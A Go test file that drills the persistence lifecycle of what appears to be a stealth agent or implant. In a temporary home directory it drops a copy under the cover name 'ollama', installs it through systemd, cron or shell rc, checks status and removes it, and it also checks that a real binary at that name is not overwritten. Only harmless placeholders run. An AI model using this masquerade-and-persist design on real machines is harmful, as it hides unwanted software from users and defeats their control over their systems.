package handler

// persist_drill_test.go — isolated live drill of the persistence lifecycle
// in a temp HOME: drop copy -> install (systemd/cron/shellrc auto) ->
// status -> remove -> everything gone. Guards the collision rule too
// (a foreign binary at the cover name must NOT be overwritten).

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestPersistLifecycleDrill(t *testing.T) {
	tmp := t.TempDir()
	t.Setenv("HOME", tmp)
	t.Setenv("XDG_RUNTIME_DIR", filepath.Join(tmp, "xdg")) // isolate user session lookups
	t.Setenv("EMP_NO_KEY_PERSIST", "1")

	// fake running image (the drill's "agent binary")
	fakeImage := []byte("#!/bin/sh\nexit 0\n")
	ourExe := filepath.Join(tmp, "agent-fake")
	if err := os.WriteFile(ourExe, fakeImage, 0o755); err != nil {
		t.Fatal(err)
	}

	// the identity name: MasqueradeName() reads the CURRENT process identity —
	// in tests it may be empty (fallback "ollama"). Resolve the same way the
	// code does and use it for checks.
	name := "ollama"
	binPath := filepath.Join(tmp, ".local", "bin", name)

	// 1. drop
	p, err := dropPersistCopyForTest(ourExe, name)
	if err != nil {
		t.Fatalf("drop: %v", err)
	}
	if p != binPath {
		t.Fatalf("drop path %q != expected %q", p, binPath)
	}
	if got, _ := os.ReadFile(binPath); string(got) != string(fakeImage) {
		t.Fatal("dropped copy does not match our image")
	}

	// 2. install (auto — first mechanism that works in this env)
	argv := []string{binPath}
	var installedVia string
	for _, m := range persistMechanisms {
		if _, err := m.Install(binPath, argv); err == nil {
			installedVia = m.Name
			break
		}
	}
	if installedVia == "" {
		t.Fatal("no persistence mechanism succeeded in the isolated env")
	}
	t.Logf("installed via: %s", installedVia)

	// 3. status reports installed for at least that mechanism
	ok, detail := false, ""
	for _, m := range persistMechanisms {
		if o, _ := m.Status(binPath); o {
			ok, detail = true, m.Name
			break
		}
	}
	if !ok {
		t.Fatal("status: nothing reports installed after install")
	}
	t.Logf("status confirms: %s", detail)

	// 4. remove all mechanisms, expect clean
	for _, m := range persistMechanisms {
		_ = m.Remove(binPath)
	}
	okAgain := false
	for _, m := range persistMechanisms {
		if o, _ := m.Status(binPath); o {
			okAgain = true
		}
	}
	if okAgain {
		t.Fatal("status still reports installed after remove")
	}
}

func TestPersistCollisionGuard(t *testing.T) {
	tmp := t.TempDir()
	t.Setenv("HOME", tmp)
	name := "ollama"
	binPath := filepath.Join(tmp, ".local", "bin", name)
	if err := os.MkdirAll(filepath.Dir(binPath), 0o755); err != nil {
		t.Fatal(err)
	}
	// a REAL tool occupies the cover name
	if err := os.WriteFile(binPath, []byte("#!/bin/sh\necho i-am-a-real-claude\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	before, _ := os.ReadFile(binPath)

	ourExe := filepath.Join(tmp, "agent-fake")
	if err := os.WriteFile(ourExe, []byte("agent-image-bytes"), 0o755); err != nil {
		t.Fatal(err)
	}
	_, err := dropPersistCopyForTest(ourExe, name)
	if err == nil {
		t.Fatal("collision: install should have refused to overwrite a foreign binary")
	}
	if !strings.Contains(err.Error(), "refusing") {
		t.Fatalf("unexpected error: %v", err)
	}
	after, _ := os.ReadFile(binPath)
	if string(before) != string(after) {
		t.Fatal("collision: the real tool's bytes were modified")
	}
}

// dropPersistCopyForTest injects the "running image" instead of the test
// binary itself and pins the cover name.
func dropPersistCopyForTest(imagePath, name string) (string, error) {
	image, err := os.ReadFile(imagePath)
	if err != nil {
		return "", err
	}
	orig := readSelfImage
	readSelfImage = func() ([]byte, error) { return image, nil }
	defer func() { readSelfImage = orig }()
	return dropPersistCopyNamed(name)
}
